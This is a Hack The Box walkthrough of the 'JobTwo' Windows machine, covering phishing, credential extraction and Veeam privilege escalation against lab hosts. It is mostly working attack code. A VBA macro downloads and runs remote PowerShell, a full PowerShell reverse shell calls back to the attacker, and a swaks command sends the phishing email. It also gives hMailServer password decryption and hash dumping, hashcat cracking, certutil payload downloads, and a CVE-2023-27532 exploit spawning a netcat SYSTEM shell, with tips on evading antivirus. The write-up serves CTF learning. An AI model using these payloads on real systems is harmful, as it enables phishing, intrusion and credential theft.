# JobTwo - Hack The Box Walkthrough

**Difficulty:** Hard  
**OS:** Windows Server 2022  
**Target IP:** `10.129.238.35`  
**Attacker IP:** `10.10.14.6`  
**Date:** 2026-05-22

---

## Table of Contents

1. [Executive Summary](#executive-summary)
2. [Phase 1: Reconnaissance & Enumeration](#phase-1-reconnaissance--enumeration)
3. [Phase 2: Initial Access - The Phish](#phase-2-initial-access---the-phish)
4. [Phase 3: Shell as Julian](#phase-3-shell-as-julian)
5. [Phase 4: Pivot to Ferdinand](#phase-4-pivot-to-ferdinand)
6. [Phase 5: Root - Exploiting Veeam](#phase-5-root---exploiting-veeam)
7. [Flags](#flags)
8. [The Hacker Mindset - Lessons Learned](#the-hacker-mindset---lessons-learned)

---

## Executive Summary

JobTwo is a realistic Windows corporate environment that teaches a classic attack chain: **phishing → credential extraction → local privilege escalation via third-party software**. The box exposes SMTP (hMailServer), HTTP/HTTPS (IIS), WinRM, RDP, and most critically, Veeam Backup & Replication services. The intended path is:

1. **Phish HR** with a malicious Word document containing a VBA macro.
2. **Catch a shell** as the low-privileged user `Julian`.
3. **Decrypt hMailServer's database password** to dump mail account hashes.
4. **Crack Ferdinand's password** and pivot via WinRM.
5. **Exploit CVE-2023-27532** in Veeam Backup & Replication to escalate to `SYSTEM`.

---

## Phase 1: Reconnaissance & Enumeration

### Step 1.1: Host Discovery & Port Scanning

**Command:**
```bash
nmap -Pn -p25,80,443,5985,10001,10002,10003,9401 10.129.238.35 -T4 --open
```

**Why this scan?**
- `-Pn`: The box doesn't respond to ICMP pings (common in HTB Windows boxes). We skip host discovery and treat the host as up.
- We target known-interesting ports based on typical Windows CTF patterns: SMTP (phishing vector), HTTP/HTTPS (web apps), WinRM (remote management), and the Veeam ports (10001-10003).

**Hacker Mindset:** Don't spray all 65,535 ports blindly if you know the machine's archetype. This is a corporate Windows box. SMTP + Web + WinRM + Backup software is a **classic enterprise stack**. Prioritize services that are known to be misconfigured or that interact with users.

### Step 1.2: Full Service Enumeration

**Command:**
```bash
nmap -p- --min-rate 10000 10.129.238.35 -T4 -Pn
```

**Results (key ports):**
```
22/tcp    open   ssh
25/tcp    open   smtp      hMailServer smtpd
80/tcp    open   http      Microsoft IIS 10.0
443/tcp   open   https     Microsoft IIS 10.0
445/tcp   open   microsoft-ds
5985/tcp  open   wsman     WinRM
3389/tcp  open   ms-wbt-server  RDP
10001/tcp open   msexchange-logcopier  (Veeam)
10002/tcp open   msexchange-logcopier  (Veeam)
10003/tcp open   storagecraft-image    (Veeam)
```

**Analysis:**
- **Port 25 (SMTP):** hMailServer is a Windows mail server. This is immediately interesting because SMTP is a **delivery mechanism** for phishing payloads.
- **Ports 80/443 (HTTP/HTTPS):** IIS is running. The TLS certificate on 443 reveals domain names: `job2.vl` and `www.job2.vl`.
- **Port 5985 (WinRM):** If we get credentials, this is our stable remote access path. Evil-WinRM is our friend.
- **Ports 10001-10003:** These are characteristic of **Veeam Backup & Replication**. Veeam is enterprise backup software that often runs as `SYSTEM` and has a history of nasty vulnerabilities.
- **SMB signing not enforced:** Nmap's SMB scripts show message signing is "enabled but not required." This means NTLM relay is theoretically possible, but we have no creds yet to relay.

**Hacker Mindset:** When you see a mail server + a web server + WinRM, think **phishing → initial shell → cred dumping → lateral movement**. When you see Veeam, think **privilege escalation target**. Enterprise backup software is often the "forgotten admin" — it runs with highest privileges, is rarely patched, and its configuration files are gold mines.

### Step 1.3: DNS & Web Enumeration

**Step:** Add the domain names to `/etc/hosts`.

**Command:**
```bash
echo '10.129.238.35 job2.vl www.job2.vl' | sudo tee -a /etc/hosts
```

**Why?** The SSL certificate revealed these names. Without adding them, the website might not load correctly (vhost routing), and we might miss the attack vector.

**Web Browsing:**
- Visiting `http://10.129.238.35` or `http://job2.vl` returns IIS default 404.
- Visiting `http://www.job2.vl` returns a fake company website for a boat rental business.

**Critical Finding:** The website says:
> "We are looking for a new captain! Send your resume as a Microsoft Word document to hr@job2.vl"

**Hacker Mindset:** This is the **intended attack vector**. The box is literally telling you how to get in. In real-world engagements, job application portals that accept document uploads are common phishing targets. When a site asks for a specific file type (especially Word), alarm bells should ring: **macros, DDE, OLE objects**.

**Feroxbuster / Directory Brute Force:**
```bash
feroxbuster -u http://www.job2.vl
```

**Result:** Nothing interesting. Static site with `index.html`, `style.css`, `boat.jpg`. No admin panels, no login forms, no API endpoints.

**Hacker Mindset:** If the web surface is minimal and the site explicitly asks for emailed documents, **don't waste time on XSS/SQLi**. The path is social engineering / phishing. Accept what the box gives you.

---

## Phase 2: Initial Access - The Phish

### Step 2.1: Understanding the Attack Vector

We need to:
1. Create a malicious Word document with a VBA macro.
2. The macro must download and execute a reverse shell when opened.
3. Send it via SMTP to `hr@job2.vl`.
4. Wait for the victim (an automated HR bot) to open it.

**Why VBA macros?**
- Word documents natively support VBA (Visual Basic for Applications) macros.
- Macros can run automatically on document open (`AutoOpen`, `Document_Open`).
- The macro can execute shell commands — in our case, PowerShell.

**Hacker Mindset:** In red team engagements, **macro-enabled documents are still incredibly effective**. Despite Microsoft's security warnings, many enterprises either disable the warnings via GPO (rarely) or users simply click "Enable Content" out of habit. In CTFs, the victim bot usually just opens the document without hesitation.

### Step 2.2: Creating the Malicious Document on Linux

**Challenge:** We are on Kali Linux. We don't have Microsoft Word. Creating a `.docm` (macro-enabled OpenXML) or `.doc` (legacy OLE2) with VBA on Linux is non-trivial.

**Solution:** We use **`reddoc`** — a Python tool that generates `.docm` files with embedded VBA macros from templates, entirely on Linux.

**Installation:**
```bash
git clone --depth 1 https://github.com/totekuh/reddoc.git
cd reddoc
pip3 install . --break-system-packages
```

**Generating the document:**
```bash
reddoc template docm iex --set URL=http://10.10.14.6/shell.ps1 | reddoc docm -o resume.docm
```

**What this does:**
- Uses the `iex` template (PowerShell IEX cradle).
- Embeds a macro that runs:
  ```vba
  Sub MyMacro()
      Dim cmd As String
      cmd = "powershell -ep bypass -w hidden -c ""$r=Invoke-WebRequest -UseBasicParsing -Uri 'http://10.10.14.6/shell.ps1';$b=$r.Content;$c=-join($b|ForEach-Object{[char]$_});$c|IEX"""
      Shell cmd, vbHide
  End Sub
  ```
- The macro triggers on both `AutoOpen` and `Document_Open` for maximum compatibility.

**Hacker Mindset:** Using a **two-stage payload** (macro downloads script, script executes shell) is stealthier than embedding the entire shellcode in the macro. The macro itself only contains a benign-looking download command. The real payload (`shell.ps1`) is hosted on our server and never touches disk permanently. This bypasses some AV static analysis.

### Step 2.3: Creating the PowerShell Reverse Shell

**File:** `shell.ps1`
```powershell
$c = New-Object System.Net.Sockets.TCPClient('10.10.14.6',4444)
$s = $c.GetStream()
[byte[]]$b = 0..65535|%{0}
while(($i = $s.Read($b, 0, $b.Length)) -ne 0) {
    $d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b, 0, $i)
    $r = (iex $d 2>&1 | Out-String)
    $r2 = $r + 'PS ' + (pwd).Path + '> '
    $rb = ([text.encoding]::ASCII).GetBytes($r2)
    $s.Write($rb, 0, $rb.Length)
    $s.Flush()
}
$c.Close()
```

**Why this specific reverse shell?**
- It's a **pure PowerShell** TCP reverse shell. No external binaries needed.
- It gives us an interactive PowerShell prompt with working directory display.
- It handles errors gracefully (`2>&1`) and returns output cleanly.

**Hacker Mindset:** Always prefer **PowerShell or Python one-liners** over binary payloads for initial access. Binaries get flagged by AV/EDR. PowerShell is native to Windows, lives off the land, and can be obfuscated or encoded if needed.

### Step 2.4: Setting Up the Infrastructure

**Terminal 1 - HTTP Server (serves shell.ps1):**
```bash
cd ~/Downloads/jobtwo
python3 -m http.server 80
```

**Terminal 2 - Netcat Listener (catches the shell):**
```bash
rlwrap -cAr nc -lvnp 4444
```

**Why `rlwrap`?** It gives us readline support (arrow keys, command history) in the netcat shell, making interaction much more pleasant.

**Why port 80 for HTTP?** The macro uses a standard HTTP URL. Using port 80 avoids firewall issues and looks less suspicious.

**Why port 4444?** Any high port works. 4444 is a common CTF convention. We avoid 443 here to not need root privileges for binding.

**Hacker Mindset:** Infrastructure discipline is key. Label your terminals. Know which port does what. In real engagements, you'd use a redirector or VPS to hide your origin IP.

### Step 2.5: Sending the Phishing Email

**Tool:** `swaks` (Swiss Army Knife for SMTP)

**Command:**
```bash
swaks --to hr@job2.vl \
  --from "candidate@job2.vl" \
  --header "Subject: Job Application" \
  --body "Please review my attached CV." \
  --attach @resume.docm \
  --server 10.129.238.35
```

**Critical detail:** The `@` before `resume.docm` is **mandatory**. Without it, `swaks` sends the filename as text rather than attaching the actual file.

**Why `swaks`?** It's the easiest CLI tool for crafting SMTP emails with attachments. It handles MIME encoding automatically.

**Why no TLS?** hMailServer on port 25 accepts plaintext SMTP. We don't need TLS for delivery.

**Hacker Mindset:** When crafting phishing emails, **mimic legitimacy**. Use a plausible sender (`candidate@job2.vl`), a professional subject line, and a short body. In real red teams, you'd spoof the From header or use a lookalike domain. Here, the bot doesn't validate — but good habits matter.

### Step 2.6: The Callback

**Expected timeline:**
- Email sends successfully (`250 Queued`)
- 1–3 minutes later: HTTP server shows `GET /shell.ps1`
- Immediately after: Netcat receives connection

**Verification:**
```
PS C:\WINDOWS\system32> whoami
job2\julian
```

**Hacker Mindset:** Patience. Automated bots on CTF boxes have delays. If you don't get a callback in 60 seconds, **don't panic**. Don't start changing things. Give it 2–3 minutes. In real phishing, callbacks can take hours or days.

---

## Phase 3: Shell as Julian

### Step 3.1: Stabilizing the Shell

We have a PowerShell reverse shell via netcat. It's functional but basic.

**Quick enumeration commands:**
```powershell
whoami
hostname
ipconfig
```

**Hacker Mindset:** Your first shell is fragile. Don't run heavy commands that might crash it. Do **minimal, targeted enumeration** to understand your context before moving.

### Step 3.2: User Enumeration

**Command:**
```powershell
net user
```

**Output:**
```
User accounts for \\JOB2
-------------------------------------------------------------------------------
Administrator            DefaultAccount           Ferdinand                
Guest                    Julian                   svc_veeam                
WDAGUtilityAccount       
```

**Analysis:**
- `Julian` is our current user.
- `Ferdinand` is another regular user with a home directory (seen later).
- `svc_veeam` is a service account — confirms Veeam is installed.
- `Administrator` is the local admin we need to reach.

**Command:**
```powershell
net user Ferdinand
```

**Key finding:** Ferdinand is a member of `Remote Management Users` and `Remote Desktop Users`. This means he can authenticate via WinRM and RDP.

**Hacker Mindset:** When you land on a Windows box, **immediately enumerate users and groups**. Look for users in `Remote Management Users` (WinRM access), `Remote Desktop Users` (RDP access), or administrators. These are your pivot targets.

### Step 3.3: Finding hMailServer

**Command:**
```powershell
Get-ChildItem "C:\Program Files (x86)\hMailServer"
```

**Why look here?** We know hMailServer is the SMTP daemon (from Nmap). If we can access its configuration or database, we might find credentials or password hashes.

**Key file:** `C:\Program Files (x86)\hMailServer\Bin\hMailServer.INI`

**Contents:**
```ini
[Security]
AdministratorPassword=8a53bc0c0c9733319e5ee28dedce038e

[Database]
Type=MSSQLCE
Password=4e9989caf04eaa5ef87fd1f853f08b62
PasswordEncryption=1
```

**Hacker Mindset:** Configuration files are **low-hanging fruit**. Applications often store passwords in INI, XML, or config files. Even if encrypted, the encryption scheme might be weak or use a known key. Always grep for `password`, `passwd`, `pwd`, `secret`, `key` in config files.

### Step 3.4: Decrypting the hMailServer Database Password

**Research:** hMailServer uses **Blowfish encryption** with a hardcoded key: `THIS_KEY_IS_NOT_SECRET`. The encryption also involves endianness swapping.

**Decryption script (Python):**
```python
#!/usr/bin/env python3
import sys, binascii, struct
from Crypto.Cipher import Blowfish

def swap_endianness(data):
    result = b''
    for i in range(0, len(data), 4):
        word = data[i:i+4]
        if len(word) == 4:
            result += word[::-1]
        else:
            result += word
    return result

key = b'THIS_KEY_IS_NOT_SECRET'
encrypted = binascii.unhexlify(sys.argv[1])
encrypted_swapped = swap_endianness(encrypted)
cipher = Blowfish.new(key, Blowfish.MODE_ECB)
decrypted = cipher.decrypt(encrypted_swapped)
decrypted_swapped = swap_endianness(decrypted)
print(decrypted_swapped.rstrip(b'\x00').decode('utf-8', errors='replace'))
```

**Command:**
```bash
python3 hmail_decrypt.py 4e9989caf04eaa5ef87fd1f853f08b62
```

**Result:** `95C02068FD5D`

**Hacker Mindset:** When you see `PasswordEncryption=1`, investigate immediately. Google the application name + "decrypt password." Many applications use homegrown crypto or hardcoded keys. This is a **classic CTF pattern** and a real-world vulnerability class.

### Step 3.5: Dumping the Mail Database

The database is a SQL Server Compact Edition (`.sdf`) file. It's locked by the hMailServer process, so we copy it and upgrade it.

**Commands (from Julian shell):**
```powershell
copy "C:\Program Files (x86)\hMailServer\Database\hMailServer.sdf" C:\Windows\Temp\
Add-Type -Path "C:\Program Files (x86)\Microsoft SQL Server Compact Edition\v4.0\Desktop\System.Data.SqlServerCe.dll"
$engine = New-Object System.Data.SqlServerCe.SqlCeEngine("Data Source=C:\Windows\Temp\hMailServer.sdf;Password='95C02068FD5D'")
$engine.Upgrade("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf")
$conn = New-Object System.Data.SqlServerCe.SqlCeConnection("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf;Password='95C02068FD5D'")
$conn.Open()
```

**Dump account hashes:**
```powershell
$cmd = $conn.CreateCommand()
$cmd.CommandText = "SELECT accountaddress, accountpassword FROM hm_accounts"
$reader = $cmd.ExecuteReader()
while($reader.Read()) { $reader["accountaddress"] + ":" + $reader["accountpassword"] }
```

**Output:**
```
Julian@job2.vl:8981c81abda0acadf1d12dd9d213bac7c51c022a34268058af3757607075e0eb49f76f
Ferdinand@job2.vl:04063d4de2e5d06721cfbd7a31390d02d18941d392e86aabe02eda181d9702838baa11
hr@job2.vl:1a5adad158ccffd81db73db040c72109067add598fafc47bbbd92da9a69661af94f055
```

**Hacker Mindset:** Databases are **credential treasure troves**. Even if passwords are hashed, cracking one hash can give you lateral movement. Always dump user tables, password history tables, and API key tables. The format here is SHA256-based (hMailServer custom format, hashcat mode 1421).

### Step 3.6: Cracking Ferdinand's Password

**Tool:** `hashcat`

**Command:**
```bash
echo 'Ferdinand@job2.vl:04063d4de2e5d06721cfbd7a31390d02d18941d392e86aabe02eda181d9702838baa11' > hashes.txt
hashcat hashes.txt /usr/share/wordlists/rockyou.txt --user
```

**Result:**
```
04063d4de2e5d06721cfbd7a31390d02d18941d392e86aabe02eda181d9702838baa11:Franzi123!
```

**Hacker Mindset:** Password cracking is about **efficient wordlist selection**. `rockyou.txt` is the go-to for CTFs. In real engagements, use breached password lists, company-specific wordlists, and masks. Ferdinand's password `Franzi123!` is a classic "name + numbers + symbol" pattern — exactly what users think is secure but isn't.

---

## Phase 4: Pivot to Ferdinand

### Step 4.1: WinRM Connection

**Tool:** `evil-winrm`

**Command:**
```bash
evil-winrm -i 10.129.238.35 -u Ferdinand -p 'Franzi123!'
```

**Why WinRM?** Ferdinand is in the `Remote Management Users` group. WinRM (port 5985) provides a stable, interactive PowerShell remoting session. It's better than our netcat shell because it supports native PowerShell cmdlets, file uploads/downloads, and is generally more robust.

**Hacker Mindset:** When you get creds, **test all access vectors** simultaneously: WinRM, RDP, SMB, SSH. WinRM is often the stealthiest and most functional for post-exploitation.

### Step 4.2: Capturing the User Flag

**Command:**
```powershell
cat C:\Users\Ferdinand\Desktop\user.txt
```

**Result:**
```
6e4ad6b[redacted]d668593c0
```

---

## Phase 5: Root - Exploiting Veeam

### Step 5.1: Confirming Veeam Installation

**Command:**
```powershell
Get-ChildItem "C:\Program Files\Veeam"
```

**Output:**
```
Backup and Replication
Backup File System VSS Integration
Veeam Distribution Service
```

**Verify version:**
```powershell
[System.Diagnostics.FileVersionInfo]::GetVersionInfo("C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").FileVersion
```

**Result:** `10.0.1.4854`

**Analysis:** Version 10.0.1.4854 is **vulnerable to CVE-2023-27532**. The patch builds are:
- v12: `12.0.0.1420 P20230223` or later
- v11: `11.0.1.1261 P20230227` or later

**Hacker Mindset:** Enterprise backup software is a **privilege escalation jackpot**. It runs as `SYSTEM`, has deep filesystem access, and is frequently unpatched. Always check versions of backup, AV, and monitoring software. These are your escalations paths.

### Step 5.2: Understanding CVE-2023-27532

**Vulnerability:** The Veeam Mount Service listens on TCP 9401 (localhost and network-facing). It deserializes .NET objects from RPC requests without proper validation. An attacker with local access can send a malicious serialized object that executes arbitrary commands as `SYSTEM`.

**Why it works here:**
- Ferdinand has local access (we have his WinRM session).
- The Mount Service runs as `NT AUTHORITY\SYSTEM`.
- The service listens on `127.0.0.1:9401`.

**Hacker Mindset:** CVE-2023-27532 is a **local privilege escalation (LPE)**. The key requirement is "local access" — even low-privileged users can exploit it. This is why getting ANY shell on a box is valuable. From there, you hunt for LPEs in software running with higher privileges.

### Step 5.3: Preparing the Exploit Files

We need 5 files on the target:
1. `VeeamHax.exe` — The exploit binary
2. `Veeam.Backup.Common.dll` — Required dependency
3. `Veeam.Backup.Model.dll` — Required dependency
4. `Veeam.Backup.Interaction.MountService.dll` — Required dependency
5. `nc64.exe` — Netcat binary for the reverse shell

**Downloading to Kali:**
```bash
cd /tmp
curl -sL -o VeeamHax.exe "https://raw.githubusercontent.com/puckiestyle/CVE-2023-27532-RCE-Only/main/VeeamHax.exe"
curl -sL -o Veeam.Backup.Common.dll "https://raw.githubusercontent.com/puckiestyle/CVE-2023-27532-RCE-Only/main/Veeam.Backup.Common.dll"
curl -sL -o Veeam.Backup.Model.dll "https://raw.githubusercontent.com/puckiestyle/CVE-2023-27532-RCE-Only/main/Veeam.Backup.Model.dll"
curl -sL -o Veeam.Backup.Interaction.MountService.dll "https://raw.githubusercontent.com/puckiestyle/CVE-2023-27532-RCE-Only/main/Veeam.Backup.Interaction.MountService.dll"
```

**Hacker Mindset:** When exploiting .NET applications, **dependencies matter**. The exploit binary needs the exact DLL versions that the target application uses. The `puckiestyle` fork conveniently includes these DLLs in the repo, compiled against the vulnerable Veeam version.

### Step 5.4: Transferring Files to the Target

Since `evil-winrm`'s `upload` command wasn't available in our version, we used `certutil` to download from our HTTP server.

**On Kali:** Ensure the HTTP server is running:
```bash
cd ~/Downloads/jobtwo && python3 -m http.server 80
```

**On Target (evil-winrm session):**
```powershell
cd C:\Users\Ferdinand\Documents
certutil -urlcache -split -f http://10.10.14.6/VeeamHax.exe VeeamHax.exe
certutil -urlcache -split -f http://10.10.14.6/Veeam.Backup.Common.dll Veeam.Backup.Common.dll
certutil -urlcache -split -f http://10.10.14.6/Veeam.Backup.Model.dll Veeam.Backup.Model.dll
certutil -urlcache -split -f http://10.10.14.6/Veeam.Backup.Interaction.MountService.dll Veeam.Backup.Interaction.MountService.dll
certutil -urlcache -split -f http://10.10.14.6/nc64.exe nc64.exe
```

**Why `certutil`?** It's a built-in Windows binary for certificate operations, but it has a secret weapon: `-urlcache -split -f` downloads files over HTTP. It's **living off the land** — no suspicious third-party tools needed for the transfer itself.

**Hacker Mindset:** `certutil` is a classic LOLBAS (Living Off The Land Binary). Defenders might not flag it because it's a legitimate system tool. Always know your built-in downloaders: `certutil`, `bitsadmin`, `powershell -c iwr`, `curl` (on Win10+).

### Step 5.5: Executing the Exploit

**Terminal setup:** Start a new netcat listener for the SYSTEM shell:
```bash
rlwrap -cAr nc -lvnp 9090
```

**On Target:**
```powershell
.\VeeamHax.exe --target 127.0.0.1 --cmd "C:\Users\Ferdinand\Documents\nc64.exe 10.10.14.6 9090 -e cmd.exe"
```

**What happens:**
1. `VeeamHax.exe` connects to the Veeam Mount Service on `127.0.0.1:9401`.
2. It sends a malicious deserialized .NET object.
3. The Mount Service executes our command: `nc64.exe 10.10.14.6 9090 -e cmd.exe`.
4. Since the Mount Service runs as `SYSTEM`, our command runs as `SYSTEM`.

**Expected output on listener:**
```
connect to [10.10.14.6] from (UNKNOWN) [10.129.238.35] 53402
Microsoft Windows [Version 10.0.20348.4297]
(c) Microsoft Corporation. All rights reserved.

C:\WINDOWS\system32>whoami
nt authority\system
```

**Hacker Mindset:** Target `127.0.0.1` for local services. Even if a port isn't exposed externally (nmap didn't show 9401 open from outside), it's almost certainly listening on localhost. Local services running as SYSTEM are the **holy grail of privilege escalation**.

### Step 5.6: Capturing the Root Flag

**Command:**
```cmd
type C:\Users\Administrator\Desktop\root.txt
```

**Result:**
```
641a40[redacted]1e94ec8c0
```

---

## Flags

| Location | Path | Value |
|----------|------|-------|
| User Flag | `C:\Users\Ferdinand\Desktop\user.txt` | `6e4ad6b[redacted]668593c0` |
| Root Flag | `C:\Users\Administrator\Desktop\root.txt` | `641a40[redacted]e94ec8c0` |

---

## The Hacker Mindset - Lessons Learned

### 1. Reconnaissance is 90% of the battle
Nmap didn't just show ports; it showed an **archetype**: Windows corporate box with email, web, remote management, and backup software. Each service suggested a phase of the attack. Don't scan blindly — interpret the results.

### 2. Follow the intended path (but verify)
The website literally told us to send a Word document. In CTFs, this is the intended vector. In real life, job portals accepting resumes are **prime phishing targets**. Always look for human-interaction points: HR portals, contact forms, email addresses.

### 3. Two-stage payloads are stealthier
Embedding a full reverse shell in a macro is noisy. A simple PowerShell download cradle (`IEX(IWR ...)`) is short, less suspicious, and the real payload lives on your server. This is how real malware operates.

### 4. Configuration files = credentials
hMailServer stored its database password in an INI file, encrypted with a **hardcoded key**. This is absurdly common in real software. Always grep configs for passwords, API keys, and connection strings.

### 5. Crack efficiently
We didn't need to crack Julian's or hr's hashes. We only needed Ferdinand's because he's in `Remote Management Users`. Focus your cracking efforts on **high-value targets**, not every hash you find.

### 6. Enterprise software is the weak link
Veeam Backup & Replication was the key to SYSTEM. Backup software, AV consoles, monitoring agents, and hypervisor tools often run with highest privileges and are **patched less frequently** than the OS itself. They're your privilege escalation targets.

### 7. Localhost services matter
Port 9401 wasn't open externally, but it was listening on `127.0.0.1`. Once you have any shell on a box, **always scan localhost**. Tools like `netstat -ano`, `Get-NetTCPConnection`, or static compiled `nmap` can reveal these hidden gems.

### 8. Patience pays
The phishing callback took 2–3 minutes. In real engagements, initial access can take hours, days, or weeks. Don't panic. Don't change your payload prematurely. Let the bot do its job.

---

*Happy Hacking! *
